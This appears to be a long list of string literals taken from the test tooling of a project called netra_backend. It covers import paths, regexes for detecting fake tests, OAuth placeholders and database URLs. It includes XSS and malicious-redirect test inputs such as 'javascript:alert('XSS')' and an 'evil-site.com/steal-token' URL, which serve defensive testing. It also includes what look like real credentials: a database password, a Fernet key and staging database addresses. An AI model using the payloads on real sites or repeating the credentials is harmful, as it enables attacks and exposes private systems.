    "datetime",
    "day_of_week",
    "db",
    "db_latencies",
    "db_name",
    "db_queries",
    "debug",
    "decorator spacing",
    "decorator spacing for sync functions",
    "def",
    "def __init__(self):",
    "def _setup_test_data(self):\n        \"\"\"Setup test data and configurations\"\"\"",
    "def _verify_results(self, results):\n        \"\"\"Verify test results and assertions\"\"\"",
    "def mock_components",
    "def real_components",
    "def test_",
    "def test_\\\\w+\\\\([^)]*\\\\):[^{]*?(?:pass|return)",
    "def test_{name}(self):\\n        \"\"\"Test {path}\"\"\"\\n        # Critical path that must be tested\\n        # TODO: Implement comprehensive test\\n        pass\\n    \\n",
    "def\\s+(\\w+)",
    "def\\s+(\\w+)\\s*\\(",
    "def\\s+\\w*_mock\\w*",
    "def\\s+\\w+\\([^)]*\\)\\s*:\\s*\\n\\s*\\.\\.\\.\\s*$",
    "def\\s+\\w+\\([^)]*\\)\\s*:\\s*\\n\\s*pass\\s*$",
    "def\\s+\\w+\\(\\*args\\s*,\\s*\\*\\*kwargs\\)\\s*:\\s*\\n.*return\\s*\\{",
    "def\\s+create_mock_\\w*component",
    "def\\s+mock_\\w*_component",
    "def\\s+mock_\\w+",
    "default",
    "degradation_factor",
    "degraded",
    "delete",
    "delta",
    "denied",
    "dependencies",
    "dependency_aware",
    "dependency_resolution",
    "dependency_resolution     â†’ test_06_services_starting_before_dependencies",
    "deployment_related",
    "deprecated",
    "describe(",
    "describe\\s*\\(\\s*[\\'\"]([^\\'\"]*)[\\'\"]",
    "description",
    "desktop",
    "detail",
    "detailed_analysis",
    "detailed_metrics",
    "details",
    "dev",
    "devDependencies",
    "dev_client_id_123",
    "dev_google_client_123",
    "dev_launcher/tests",
    "dev_secret_456",
    "development",
    "development mode",
    "device",
    "device_",
    "device_id",
    "diagnosis_assistance",
    "diff",
    "dim",
    "directories",
    "directories:",
    "directory",
    "disabled",
    "disconnected",
    "dist",
    "dist-packages",
    "docker",
    "docker run --name postgres -e POSTGRES_PASSWORD=password -p 5432:5432 -d postgres",
    "docker-compose",
    "docker-compose.test.yml",
    "document_analysis",
    "does not exist",
    "does not exist (OK if service has no tests)",
    "does not exist, skipping.",
    "doesn't need splitting (",
    "dry_run",
    "dummy",
    "dummy_refresh",
    "duplicate",
    "duplicate MagicMock import",
    "duplicate tests",
    "duplicates",
    "duration",
    "duration_days",
    "e2e",
    "e2e-user",
    "e2e@netrasystems.ai",
    "e2e_coverage",
    "early",
    "early|starter|standard",
    "ecommerce",
    "efficiency",
    "element",
    "email",
    "emerald",
    "empty/auto-pass tests immediately",
    "empty_implementation",
    "empty_implementations",
    "enabled",
    "end-to-end",
    "end_line",
    "end_lineno",
    "end_of_quarter",
    "end_time",
    "end_to_end",
    "endpoint",
    "endpoints",
    "enforce_session_limits",
    "english",
    "enterprise",
    "enterprise:api_access",
    "enterprise:manage_billing",
    "enterprise:manage_teams",
    "enterprise:view_analytics",
    "enterprise|premium|sso|saml|sla",
    "env",
    "env vars",
    "env.ACT",
    "env_",
    "env_file",
    "env_vars",
    "environment",
    "environment_name",
    "error",
    "error rate",
    "error:",
    "error_cascade",
    "error_cascades",
    "error_code",
    "error_description",
    "error_handlers",
    "error_handling",
    "error_message",
    "error_rate",
    "error_score",
    "error_type",
    "errors",
    "estimatedTime",
    "estimated_improvement",
    "estimated_lines",
    "estimated_revenue_usd",
    "event_metadata",
    "event_type",
    "exact duplicate test pairs. These should be immediately reviewed and consolidated.",
    "example.com",
    "example_message_id",
    "example_message_metadata",
    "examples",
    "excellent",
    "exception",
    "exception:",
    "excessive_mocking",
    "execution_plan",
    "execution_results",
    "exists in",
    "exit_code",
    "exp",
    "expect(",
    "expected_exit_code",
    "expected_patterns",
    "expected_status",
    "expected_valid",
    "expected_value",
    "expired",
    "expired.token.signature",
    "expired1",
    "expired123",
    "expired_session",
    "expired_sessions_cleaned",
    "expires_at",
    "expires_in",
    "exponential",
    "exponential_spread",
    "external_services",
    "extract-user",
    "extract@netrasystems.ai",
    "extract_utilities",
    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
    "eyJhbGciOiJIUzI1NiJ9.",
    "f",
    "fail_fast",
    "fail_fast_enabled",
    "fail_fast_threshold",
    "failed",
    "failed to exchange authorization code",
    "failed:",
    "failed_files",
    "failed_requests",
    "failed_tests",
    "failing",
    "failing tests",
    "failing tests to process",
    "failing tests** tracked in bad_tests.json",
    "failing_agent",
    "failing_tests",
    "failure",
    "failure_rate",
    "failure_reason",
    "failure_scan.json",
    "failure_start",
    "failures",
    "failures_found",
    "fair",
    "fake",
    "fake tests found",
    "fake tests found in",
    "fake tests in",
    "fake tests requiring attention",
    "fake tests, severity:",
    "fake_test_count",
    "fake_tests",
    "fake_tests_by_directory",
    "fake_tests_by_severity",
    "fake_tests_by_type",
    "fake_token",
    "fallback_mode",
    "false",
    "fast",
    "feature",
    "feature_based",
    "fernet-key",
    "fernet_key",
    "file",
    "file=",
    "file_analyses",
    "file_error",
    "file_fixes",
    "file_path",
    "file_path,line_number,violation_type,severity,description,recommended_action",
    "file_pattern",
    "file_size",
    "file_splits",
    "file_system",
    "files",
    "files (already correct or no setup_test_path)",
    "files (use --limit=N to change)",
    "files don't use setup_test_path",
    "files fixed:",
    "files have correct import order",
    "files have import order issues",
    "files in priority order:",
    "files with issues",
    "files with references:",
    "files with size violations addressed",
    "files with syntax errors",
    "files)",
    "files):",
    "files** in test_framework directory",
    "files, modified",
    "files_affected",
    "files_created",
    "files_exceeding_300_lines",
    "files_exceeding_limit",
    "files_fixed",
    "files_over_300",
    "files_processed",
    "files_split",
    "files_with_errors",
    "files_with_long_functions",
    "files_with_mock_components",
    "find",
    "finish_reason",
    "fintech",
    "first_failure",
    "fix_applied",
    "fix_attempted",
    "fix_command",
    "fix_delegated",
    "fix_module_import",
    "fix_needed",
    "fix_strategy",
    "fix_suggestion",
    "fixed",
    "fixes",
    "fixes_applied",
    "fixture",
    "fixture_similarity",
    "fixtures",
    "fixtures.py",
    "flaky",
    "flaky_tests",
    "flu_season",
    "focused test functions or use helper methods",
    "focused test modules",
    "following backend pattern",
    "for functions to implement",
    "for input",
    "for splitting opportunities...",
    "formatDuration formats time correctly",
    "formatLatency formats latency correctly",
    "framework",
    "fraud_detection",
    "free",
    "free|trial|basic|onboarding",
    "from",
    "from .",
    "from app\\.",
    "from conftest import",
    "from netra_backend",
    "from netra_backend.",
    "from netra_backend.app.",
    "from netra_backend.app.agents.tool_dispatcher import ToolDispatcher",
    "from netra_backend.app.llm.llm_manager import LLMManager",
    "from netra_backend.app.models.session import Session as UserSession",
    "from netra_backend.app.models.user import User\n# UserPlan not yet implemented - using placeholder\nUserPlan = type('UserPlan', (), {'FREE': 'free', 'EARLY': 'early', 'MID': 'mid', 'ENTERPRISE': 'enterprise'})",
    "from netra_backend.app.websocket.connection_manager import ConnectionManager as WebSocketConnectionManager",
    "from netra_backend.app.websocket_core.manager import WebSocketManager as UnifiedWebSocketManager",
    "from netra_backend.tests.conftest import",
    "from netra_backend.tests.fixtures",
    "from netra_backend.tests.helpers",
    "from netra_backend.tests.test_utils import setup_test_path",
    "from netra_backend\\.app\\.db\\.clickhouse import ClickHouseManager",
    "from netra_backend\\.app\\.db\\.models_agent import Agent, AgentRun",
    "from netra_backend\\.app\\.db\\.models_agent import AgentRun",
    "from netra_backend\\.app\\.models\\.conversion_event import ConversionEvent",
    "from netra_backend\\.app\\.models\\.message import Message",
    "from netra_backend\\.app\\.models\\.session import UserSession",
    "from netra_backend\\.app\\.models\\.team import Team",
    "from netra_backend\\.app\\.models\\.thread import Thread",
    "from netra_backend\\.app\\.models\\.user import User, UserPlan",
    "from netra_backend\\.app\\.websocket\\.connection_manager import WebSocketConnectionManager",
    "from netra_backend\\.tests\\.e2e\\.data",
    "from netra_backend\\.tests\\.e2e\\.fixtures",
    "from netra_backend\\.tests\\.e2e\\.helpers",
    "from netra_backend\\.tests\\.e2e\\.infrastructure",
    "from netra_backend\\.tests\\.e2e\\.validators",
    "from netra_backend\\.tests\\.integration\\.database_test_fixtures import.*",
    "from netra_backend\\.tests\\.test_utils",
    "from netra_backend\\.tests\\.test_utils import setup_test_path\\n",
    "from netra_backend\\.tests\\.user_flow_base import.*",
    "from netra_backend\\.tests\\.user_journey_data import.*",
    "from pathlib import Path",
    "from test_framework.\\1 import",
    "from test_framework\\.(\\w+) import",
    "from tests.e2e.account_deletion_flow_manager",
    "from tests.e2e.agent_conversation_helpers",
    "from tests.e2e.auth_flow_testers",
    "from tests.e2e.config",
    "from tests.e2e.config import",
    "from tests.e2e.data",
    "from tests.e2e.fixtures",
    "from tests.e2e.fixtures.core.thread_test_fixtures_core",
    "from tests.e2e.fixtures.high_volume_data",
    "from tests.e2e.helpers",
    "from tests.e2e.helpers.",
    "from tests.e2e.helpers.auth.oauth_journey_helpers",
    "from tests.e2e.helpers.chat_helpers",
    "from tests.e2e.helpers.core.chat_helpers",
    "from tests.e2e.helpers.core.unified_flow_helpers",
    "from tests.e2e.helpers.database.database_sync_helpers",
    "from tests.e2e.helpers.database_sync_helpers",
    "from tests.e2e.helpers.journey.journey_validation_helpers",
    "from tests.e2e.helpers.journey.new_user_journey_helpers",
    "from tests.e2e.helpers.journey.real_service_journey_helpers",
    "from tests.e2e.helpers.journey.user_journey_helpers",
    "from tests.e2e.helpers.journey_validation_helpers",
    "from tests.e2e.helpers.new_user_journey_helpers",
    "from tests.e2e.helpers.oauth_journey_helpers",
    "from tests.e2e.helpers.real_service_journey_helpers",
    "from tests.e2e.helpers.unified_flow_helpers",
    "from tests.e2e.helpers.user_journey_helpers",
    "from tests.e2e.helpers.websocket.websocket_test_helpers",
    "from tests.e2e.helpers.websocket_test_helpers",
    "from tests.e2e.infrastructure",
    "from tests.e2e.integration.auth_flow_manager",
    "from tests.e2e.jwt_token_helpers",
    "from tests.e2e.jwt_token_helpers import",
    "from tests.e2e.oauth_test_providers",
    "from tests.e2e.oauth_test_providers import",
    "from tests.e2e.onboarding_flow_executor",
    "from tests.e2e.test_helpers.performance_base",
    "from tests.e2e.validators",
    "from tests.test_utils",
    "from tests\\.config",
    "from tests\\.config import",
    "from tests\\.e2e\\.auth_flow_testers",
    "from tests\\.e2e\\.high_volume_data",
    "from tests\\.e2e\\.integration\\.account_deletion_flow_manager",
    "from tests\\.e2e\\.integration\\.agent_conversation_helpers",
    "from tests\\.e2e\\.integration\\.auth_flow_manager",
    "from tests\\.e2e\\.integration\\.onboarding_flow_executor",
    "from tests\\.e2e\\.integration\\.thread_test_fixtures_core",
    "from tests\\.e2e\\.performance_base",
    "from tests\\.e2e\\.thread_test_fixtures_core",
    "from tests\\.fixtures",
    "from tests\\.helpers",
    "from tests\\.jwt_token_helpers",
    "from tests\\.jwt_token_helpers import",
    "from tests\\.oauth_test_providers",
    "from tests\\.oauth_test_providers import",
    "from tests\\.unified\\.e2e\\.fixtures",
    "from tests\\.unified\\.e2e\\.helpers",
    "from typing import",
    "from typing import Dict, Any, List, Optional",
    "from typing import List, Dict, Tuple, Optional, Any",
    "from unittest.mock import",
    "from unittest.mock import AsyncMock, MagicMock, Mock, patch",
    "from unittest.mock import Mock, MagicMock, patch",
    "from unittest\\.mock import.*MagicMock.*MagicMock",
    "frontend",
    "frontend/__tests__/system/startup.test.tsx",
    "frontend/components/chat",
    "frontend/tests",
    "frontend/tests/conftest.py",
    "frontend_coverage",
    "frontend_url",
    "full",
    "full_",
    "full_name",
    "full_path",
    "function",
    "function\\s+mock\\w*\\s*\\(",
    "function_name",
    "function_refactors",
    "function_size",
    "function_to_fixture",
    "function_to_function",
    "functionality tests.\n\"\"\"\n\nimport pytest\nimport asyncio\nfrom typing import Dict, List, Any, Optional",
    "functions",
    "functions)",
    "functions_exceeding_limit",
    "functions_optimized",
    "functions_over_8",
    "functions_to_implement.txt",
    "gamma",
    "gc_count",
    "gemini",
    "gemini-1.5-flash",
    "gemini-2.5-flash",
    "gemini-2.5-pro",
    "gemini-api-key",
    "gemini-pro",
    "generated_at",
    "generated_files",
    "getConnectionQuality categorizes latency correctly",
    "getConnectionState converts WebSocket status correctly",
    "getStatusInfo returns correct display info",
    "get_all",
    "get_auth_database_url_async",
    "get_auth_database_url_async must be callable",
    "get_auth_database_url_async should be callable",
    "get_auth_database_url_async should return string",
    "git",
    "github",
    "github_access_",
    "github_access_token_123",
    "github_refresh_token_123",
    "good",
    "google",
    "google_123456",
    "google_access_",
    "google_access_token_123",
    "google_client_123",
    "google_client_id",
    "google_id_token_123",
    "google_refresh_",
    "google_refresh_token_123",
    "google_test_user_123",
    "google_user_1",
    "google_user_2",
    "google_user_3",
    "gpt-3.5-turbo",
    "gpt-4",
    "gpt-4-turbo",
    "graceful_degradation",
    "graceful_degradation      â†’ test_10_graceful_degradation_optional_services",
    "gradual_increase",
    "grant_method",
    "granted_at",
    "granted_by",
    "green",
    "guessed_secret",
    "hacker-user",
    "hacker-user-999",
    "hacker@evil.com",
    "handler",
    "handlers",
    "hardcoded_test_data",
    "hardcoded_wait",
    "harness.py",
    "has",
    "has failing tests!",
    "has no attribute 'get_auth_database_url_async'",
    "has no end-to-end tests",
    "has only",
    "has_docstring",
    "has_return",
    "hashed_password",
    "header.payload",
    "header.payload.signature.extra",
    "headers",
    "health",
    "health_endpoint",
    "health_status",
    "healthcare",
    "healthy",
    "heap size",
    "help_display",
    "helper",
    "helpers)",
    "helpers.py",
    "high",
    "high failure rate tests",
    "high_error_rate",
    "high_failure_rate",
    "high_latency",
    "high_load",
    "high_value_test_count",
    "highlight",
    "highly similar test pairs. Consider refactoring these using parametrized tests or test utilities.",
    "highly_similar",
    "hit_rate",
    "hits",
    "hmac_test_code_",
    "holiday_season",
    "hooks",
    "host.com:5432",
    "hour_of_day",
    "html",
    "htmlcov",
    "http",
    "http://",
    "http://localhost",
    "http://localhost:",
    "http://localhost:18001",
    "http://localhost:3000",
    "http://localhost:3000,http://localhost:3001",
    "http://localhost:3000/auth/callback",
    "http://localhost:3001",
    "http://localhost:8000",
    "http://localhost:8000/health",
    "http://localhost:8081",
    "http://localhost:8081/auth/callback",
    "http://localhost:8081/auth/dev/login",
    "http://localhost:8081/auth/login",
    "http://localhost:8081/auth/logout",
    "http://localhost:8081/auth/token",
    "http://localhost:8081/auth/verify",
    "http://localhost:8081/health",
    "http://localhost:8083",
    "http://malicious-site.com",
    "http_client",
    "https://",
    "https://accounts.google.com",
    "https://api.netra.systems",
    "https://api.staging.netra.ai",
    "https://api.staging.netrasystems.ai",
    "https://app.example.com",
    "https://app.example.com/auth/callback",
    "https://app.staging.netra.ai",
    "https://app.staging.netrasystems.ai",
    "https://auth-service.staging.netra.ai",
    "https://auth.example.com/auth/login",
    "https://auth.example.com/auth/logout",
    "https://auth.example.com/auth/token",
    "https://auth.example.com/auth/verify",
    "https://auth.staging.netrasystems.ai",
    "https://avatars.githubusercontent.com/",
    "https://dev.netra.systems",
    "https://evil-site.com",
    "https://evil-site.com/steal-token",
    "https://evil.com",
    "https://example.com/avatar.jpg",
    "https://example.com/avatar/",
    "https://example.com/john.jpg",
    "https://example.com/photo.jpg",
    "https://malicious-site.com",
    "https://staging.netra.ai/auth/callback",
    "https://staging.netra.systems",
    "httpx",
    "httpx.AsyncClient",
    "httpx.AsyncClient.get",
    "httpx.AsyncClient.post",
    "hybrid",
    "iZAG-Kz661gRuJXEGzxgghUFnFRamgDrjDXZE6HdJkw=",
    "iat",
    "id",
    "id_token",
    "identified_bottlenecks",
    "immediate_fixes",
    "impact_analysis",
    "impact_level",
    "impact_multiplier",
    "import",
    "import (",
    "import *",
    "import app\\.",
    "import netra_backend",
    "import netra_backend.app.",
    "import pytest",
    "import pytest\\n",
    "import sys",
    "import tests.e2e.auth_flow_testers",
    "import tests.e2e.config",
    "import tests.e2e.jwt_token_helpers",
    "import tests.e2e.oauth_test_providers",
    "import tests\\.config",
    "import tests\\.e2e\\.auth_flow_testers",
    "import tests\\.jwt_token_helpers",
    "import tests\\.oauth_test_providers",
    "import unittest",
    "import unittest\\\\n",
    "import\\s+(.+)",
    "import_correction",
    "import_errors",
    "import_fixes",
    "import_similarity",
    "imports",
    "in",
    "inactive123",
    "inactive_sessions_cleaned",
    "include",
    "include_router",
    "indicators",
    "inf",
    "info",
    "infrastructure_costs_usd",
    "infrastructure_plumbing",
    "init",
    "initialization\"\"\"\n        # TODO: Test class instantiation\n        pass",
    "initialize",
    "input",
    "inputs",
    "install",
    "instead of",
    "insufficient_scope",
    "integration",
    "integration_tests",
    "internal overlaps. Consider reorganizing tests or extracting common test utilities.",
    "internal_overlaps",
    "into",
    "invalid",
    "invalid syntax",
    "invalid-email",
    "invalid-token-format",
    "invalid.jwt.token",
    "invalid.token",
    "invalid.token.here",
    "invalid_code",
    "invalid_combination",
    "invalid_grant",
    "invalid_request",
    "invalid_run_id",
    "invalid_state",
    "invalid_token",
    "invalid_wait",
    "io_bound",
    "ios_",
    "ip_address",
    "is already failing!",
    "is_active",
    "is_active must be boolean",
    "is_cloud_sql_environment",
    "is_cloud_sql_environment must be callable",
    "is_cloud_sql_environment should be callable",
    "is_cloud_sql_environment should return boolean",
    "is_cloud_sql_environment should return boolean, got:",
    "is_test_environment",
    "is_test_environment must be callable",
    "is_test_environment should be callable",
    "is_test_environment should return boolean",
    "is_test_environment should return boolean, got:",
    "is_verified",
    "is_weekend",
    "isolated",
    "isolation",
    "iss",
    "issue",
    "issues",
    "it(",
    "it\\s*\\(\\s*[\\'\"]([^\\'\"]*)[\\'\"]",
    "items)",
    "iteration",
    "iteration test-fix loop",
    "iterations",
    "iterations!",
    "javascript:",
    "javascript:alert('XSS')",
    "javascript:alert('attack')",
    "jest",
    "jest mocks (jest.fn:",
    "jest.config.*",
    "jest.config.cjs",
    "jest.fn()",
    "jest.mock(",
    "jest.setup.js",
    "jest.setup.real.js",
    "jest\\.fn\\(\\)",
    "jest\\.mock\\(",
    "jest\\.mock\\([\\'\"`][^\\'\"`]+[\\'\"`],\\s*\\(\\)\\s*=>\\s*\\(\\{[\\s\\S]+?return\\s*<div",
    "journeys",
    "js_excessive_mocking",
    "js_function_size",
    "js_mock_component",
    "json",
    "json_output",
    "json_output_format",
    "jti",
    "justification",
    "justified",
    "jwt",
    "jwt-secret-key",
    "jwt_handler",
    "jwt_secret_consistency",
    "jwt_secret_key",
    "largest_file",
    "largest_function",
    "last_activity",
    "latency_distribution",
    "latency_ms",
    "latency_p50_ms",
    "latency_p95_ms",
    "latency_range_ms",
    "latest/unit_report.md",
    "latin-1",
    "legacy",
    "legacy test files...",
    "legacy_framework",
    "length",
    "level",
    "lib",
    "lib64",
    "limit-test-",
    "line",
    "line limit",
    "line limit (SPEC/testing.xml)",
    "line limit:",
    "line limit:**",
    "line_number",
    "linear_decline",
    "lineno",
    "lines",
    "lines (+",
    "lines (limit:",
    "lines (max:",
    "lines and should be manually reviewed.",
    "lines)",
    "lines) manually",
    "lines):",
    "lines, exceeds 25-line limit",
    "lines, exceeds 450-line limit",
    "lines, exceeds reasonable limit",
    "lines, limit is",
    "lint",
    "llama-2-70b",
    "llm",
    "llm_calls",
    "llm_configs",
    "llm_costs",
    "llm_manager = LLMManager()",
    "llm_manager = Mock()",
    "llm_responses",
    "llm_services",
    "load",
    "load_test_config",
    "local",
    "localhost",
    "localhost,127.0.0.1,0.0.0.0",
    "localhost:",
    "localhost:5432",
    "localhost:5432/auth_db",
    "location",
    "lock_reason",
    "log_async_checkout",
    "log_patterns",
    "login",
    "login_failed",
    "login_method",
    "login_success",
    "lognormal",
    "logout",
    "logout_type",
    "low",
    "low error rate",
    "low_test_count",
    "low_throughput",
    "low_tier_coverage",
    "main_db_sync.py",
    "major",
    "major violations to address soon",
    "malformed",
    "malformed_response",
    "malicious_data",
    "malicious_headers",
    "manager",
    "managers",
    "manual_review",
    "mark",
    "markdown",
    "markers",
    "max",
    "max_error_rate",
    "max_latency_p50_ms",
    "max_latency_p95_ms",
    "max_workers",
    "may still exceed line limits",
    "medical_qa",
    "medium",
    "memory",
    "memory_aware",
    "memory_intensive",
    "memory_leak",
    "memory_mb",
    "memory_per_worker_mb",
    "memory_pressure",
    "message",
    "message_flow",
    "metadata",
    "method",
    "method\"\"\"\n        # TODO: Implement method test\n        pass",
    "method_names",
    "methods",
    "metrics",
    "microsoft/vscode",
    "microsoft_access_token_123",
    "microsoft_id_token_123",
    "microsoft_refresh_token_123",
    "mid",
    "mid|professional|advanced",
    "migration",
    "min",
    "minimal",
    "minor",
    "minor_issues",
    "minute",
    "misc",
    "misses",
    "missing dependency:",
    "missing_args",
    "missing_assertion",
    "missing_attr",
    "missing_e2e",
    "missing_item",
    "missing_module",
    "missing_name",
    "missing_required_args",
    "missing_token",
    "mobile",
    "mock",
    "mock patterns found",
    "mock usages, should use real components",
    "mock-only tests in current sprint",
    "mock\\w*Context\\s*=",
    "mock_",
    "mock_\\w+\\s*=",
    "mock_access_token",
    "mock_analysis.json",
    "mock_auth_code_123",
    "mock_client_id",
    "mock_component_class",
    "mock_component_function",
    "mock_component_pattern",
    "mock_components",
    "mock_count",
    "mock_implementation_comment",
    "mock_implementation_comments",
    "mock_only",
    "mock_reductions",
    "mock_refresh_token",
    "mock_user",
    "mocks (should be",
    "mocks, should use real components",
    "mode",
    "model",
    "model_costs_usd",
    "model_type",
    "model_usage",
    "module",
    "more",
    "more errors",
    "more files",
    "more functions",
    "more suggestions",
    "more violations",
    "more violations in",
    "ms",
    "multi_service_coverage",
    "mv",
    "name",
    "naming_patterns",
    "needs_implementation",
    "netra",
    "netra-ai-staging",
    "netra-auth-dev-instance",
    "netra-auth-service",
    "netra-auth-staging",
    "netra-auth-staging-instance",
    "netra-auth-test-instance",
    "netra-backend",
    "netra-platform",
    "netra-prod-backend",
    "netra-staging",
    "netra-staging-backend",
    "netra-test",
    "netra=oauth_flow",
    "netra_backend",
    "netra_backend.app",
    "netra_backend.tests.test_utils",
    "netra_backend/app",
    "netra_backend/tests",
    "netra_backend/tests/agents",
    "netra_backend/tests/conftest.py",
    "netra_backend/tests/core",
    "netra_backend/tests/core/test_config_manager.py::TestSecretManager::test_initialization",
    "netra_backend/tests/core/test_error_handling.py::TestNetraExceptions::test_configuration_error",
    "netra_backend/tests/e2e/test_system_startup.py::TestSystemStartup",
    "netra_backend/tests/integration",
    "netra_backend/tests/integration/test_logging_audit_integration_core.py",
    "netra_backend/tests/integration/test_logging_audit_integration_helpers.py",
    "netra_backend/tests/integration/test_message_flow_auth_core.py",
    "netra_backend/tests/integration/test_message_flow_errors_core.py",
    "netra_backend/tests/integration/test_message_flow_errors_helpers.py",
    "netra_backend/tests/integration/test_message_flow_performance_core.py",
    "netra_backend/tests/integration/test_message_flow_performance_helpers.py",
    "netra_backend/tests/integration/test_message_flow_routing_core.py",
    "netra_backend/tests/integration/test_message_flow_routing_helpers.py",
    "netra_backend/tests/integration/test_unified_message_flow_core.py",
    "netra_backend/tests/integration/test_unified_message_flow_helpers.py",
    "netra_backend/tests/routes",
    "netra_backend/tests/routes/test_*auth*.py",
    "netra_backend/tests/routes/test_health_route.py",
    "netra_backend/tests/routes/test_websocket_*.py",
    "netra_backend/tests/services",
    "netra_backend/tests/services/agents",
    "netra_backend/tests/services/apex_optimizer_agent",
    "netra_backend/tests/services/database",
    "netra_backend/tests/services/test_security_service.py::test_encrypt_and_decrypt",
    "netra_backend/tests/test_agent_service_critical.py",
    "netra_backend/tests/test_api_endpoints_critical.py",
    "netra_backend/tests/test_auth*.py",
    "netra_backend/tests/test_database*.py",
    "netra_backend/tests/test_websocket.py",
    "netra_backend\\.tests\\.e2e\\.",
    "netra_dev",
    "network_partition",
    "new",
    "new files.",
    "new_files_created",
    "new_mock_token",
    "new_password",
    "next",
    "next_execution_config",
    "no:warnings",
    "no_specific_test_found",
    "node",
    "node_modules",
    "non-critical violations found",
    "nonce",
    "none",
    "nonexistent-workflow",
    "nonexistent/repo123456",
    "nonexistent/repo123456789",
    "nonexistent_repo",
    "nonexistent_workflow",
    "normal",
    "normal_operation",
    "not concurrent and not performance",
    "not configured",
    "not e2e",
    "not found",
    "not found in database",
    "not integration",
    "not slow",
    "not-a-jwt-token",
    "not-a-url",
    "not.a.token",
    "not.jwt.token",
    "npm",
    "npm test",
    "npm test -- --passWithNoTests --ci --silent",
    "npm test -- --setupFilesAfterEnv='<rootDir>/",
    "npm.cmd",
    "npx",
    "nt",
    "oauth",
    "oauth2/v2/auth",
    "oauth_callback",
    "oauth_client",
    "oauth_config",
    "oauth_env_matching",
    "oauth_error",
    "oauth_initiation",
    "oauth_mock_token",
    "oauth_provider",
    "oauth_response",
    "oauth_state_",
    "oauth_token_123",
    "oauth_validation",
    "object_type",
    "observability",
    "observability|monitoring|logging|tracing|metrics",
    "occurrence_rate",
    "onboard",
    "onerror=",
    "open",
    "openai",
    "openai|anthropic|gemini|gpt|claude",
    "openid email",
    "openid email profile",
    "openid profile",
    "optimization",
    "optimization_level",
    "optimization_recommendations",
    "optimize",
    "optimized_test_cache",
    "organizations",
    "origin",
    "original_file",
    "original_functions",
    "original_lines",
    "os",
    "os.getenv(\"ENVIRONMENT\", \"staging\")",
    "other",
    "output",
    "overall_similarity",
    "overall_success",
    "overflow",
    "oversized files",
    "p50",
    "p50_latency_ms",
    "p95",
    "p95_latency_ms",
    "p99 latency",
    "p99_latency_ms",
    "package.json",
    "pandemic_surge",
    "parallel",
    "parallel_factor",
    "parallel_safe",
    "parameter",
    "parametrize",
    "partial_result",
    "parts",
    "pass",
    "pass_rate",
    "passed",
    "passed,",
    "passed_tests",
    "password",
    "password_change",
    "password_hasher",
    "password_reset",
    "patch",
    "patch(",
    "patch\\(",
    "path",
    "path.exists",
    "path_pattern",
    "paths",
    "pattern",
    "payload",
    "peak_hours",
    "peak_multiplier",
    "peak_rps",
    "pending",
    "percent_covered",
    "percentage",
    "perf",
    "performance",
    "performance_analysis",
    "performance_data",
    "performance_degradation",
    "performance_grade",
    "performance_metrics",
    "performance_scores",
    "permission",
    "permission_granted",
    "permission_id",
    "permission_revoked",
    "permissions",
    "picture",
    "pid",
    "ping",
    "pkce",
    "pong",
    "pool_size",
    "poolclass",
    "poor",
    "port",
    "port_allocation",
    "port_allocation           â†’ test_08_port_binding_race_conditions",
    "post-deploy-error",
    "post-deploy-warning",
    "postgres",
    "postgres://",
    "postgres://netra_user:password@/postgres?host=/cloudsql/instance&sslmode=require",
    "postgres://user:pass@/db?host=/cloudsql/instance&sslmode=prefer",
    "postgres://user:pass@host.com:5432/dbname",
    "postgres://user:pass@host:5432/db",
    "postgres://user:pass@localhost/db",
    "postgres:15",
    "postgresql",
    "postgresql+asyncpg://",
    "postgresql+asyncpg://netra_staging:password@35.223.209.195:5432/netra_staging",
    "postgresql+asyncpg://netra_user:password@/postgres?host=/cloudsql/instance",
    "postgresql+asyncpg://postgres:",
    "postgresql+asyncpg://postgres:DTprdt5KoQXlEG4Gh9lF@localhost:5433/netra_dev",
    "postgresql+asyncpg://postgres:password@localhost:5432/auth",
    "postgresql+asyncpg://postgres:postgres@localhost:5432/test_auth_service",
    "postgresql+asyncpg://test:test@localhost:5432/test_db",
    "postgresql+asyncpg://user:pass@/db?host=/cloudsql/project:region:instance&sslmode=require",
    "postgresql+asyncpg://user:pass@host:5432/db",
    "postgresql+asyncpg://user:pass@host:5432/db?ssl=require",
    "postgresql+asyncpg://user:pass@host:5432/db?sslmode=require",
    "postgresql+asyncpg://user:pass@localhost/db",
    "postgresql+asyncpg://user:pass@localhost/db?sslmode=require",
    "postgresql+asyncpg://user:pass@localhost:5432/db",
    "postgresql+psycopg2://user:pass@host:5432/db",
    "postgresql+psycopg2://user:pass@host:5432/db?sslmode=require",
    "postgresql+psycopg://user:pass@host:5432/db",
    "postgresql://",
    "postgresql://netra_test:test_password@localhost:5433/netra_test",
    "postgresql://netra_user:$(STAGING_DB_PASSWORD)@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require",
    "postgresql://netra_user:secret_password@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require",
    "postgresql://netra_user:staging_pass@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require",
    "postgresql://netra_user:staging_password@/postgres?host=/cloudsql/netra-staging:us-central1:netra-postgres&sslmode=require",
    "postgresql://postgres:wrong_password@cloudsql/auth_db",
    "postgresql://test:test@localhost:5432/netra_test",
    "postgresql://test:test@localhost:5432/test_db",
    "postgresql://user:pass@/db?host=/cloudsql/instance&ssl=require",
    "postgresql://user:pass@/db?host=/cloudsql/instance&sslmode=disable",
    "postgresql://user:pass@/db?host=/cloudsql/instance&sslmode=require",
    "postgresql://user:pass@/db?host=/cloudsql/project:region:instance",
    "postgresql://user:pass@/db?host=/cloudsql/project:region:instance&sslmode=require",
    "postgresql://user:pass@/dbname?host=/cloudsql/project:region:instance",
    "postgresql://user:pass@/dbname?host=/cloudsql/project:region:instance&sslmode=require",
    "postgresql://user:pass@34.132.142.103:5432/netra_staging?sslmode=require",
    "postgresql://user:pass@host/db?sslmode=require",
    "postgresql://user:pass@host:5432/db",
    "postgresql://user:pass@localhost/db",
    "postgresql://user:pass@localhost/db?ssl=require",
    "postgresql://user:pass@localhost/db?sslmode=require",
    "postgresql://user:pass@localhost/dbname?host=/cloudsql/project:region:instance",
    "postgresql://user:pass@localhost:5432/db",
    "postgresql://user:pass@localhost:5432/dbname",
    "postgresql://user:pass@localhost:5432/dbname?sslmode=require",
    "postgresql://user:pass@staging-db:5432/db?sslmode=require",
    "postgresql://user@",
    "postgres|PostgreSQL|psycopg",
    "potentially failing test files",
    "pr_number",
    "pre-deploy-1",
    "pre_deployment_validation",
    "pre_existing",
    "predictable patterns",
    "prepare",
    "previous",
    "primary_issues",
